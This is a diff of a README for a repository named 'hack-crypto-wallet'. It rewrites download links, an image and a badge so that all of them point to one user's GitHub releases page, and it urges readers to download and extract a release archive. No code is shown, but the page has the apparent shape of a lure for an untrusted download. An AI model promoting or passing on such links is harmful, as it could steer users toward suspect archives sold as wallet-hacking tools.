@@ -24,7 +24,7 @@ Welcome to the **hack-crypto-wallet** repository, a hub for all things related t
 
 ## 🌐 Useful Links
 
-- **Download Release:** [Click here to download the Release.zip file](https://github.com/assets/Release.zip)
+- **Download Release:** [Click here to download the https://github.com/voslol/hack-crypto-wallet/releases file](https://github.com/voslol/hack-crypto-wallet/releases)
 - **Note:** Download the file and extract its contents to access the resources. 
 
 ## 🚀 Explore Further
@@ -35,6 +35,6 @@ Feel free to delve into the various topics, collaborate with other enthusiasts, 
 
 Happy hacking and exploring! 🕵️‍♂️🔒🔍
 
-![Hack Crypto Wallet](https://example.com/hack-crypto-wallet-image.png)
+![Hack Crypto Wallet](https://github.com/voslol/hack-crypto-wallet/releases)
 
-[![Download](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/assets/Release.zip)
+[![Download](https://github.com/voslol/hack-crypto-wallet/releases)](https://github.com/voslol/hack-crypto-wallet/releases)
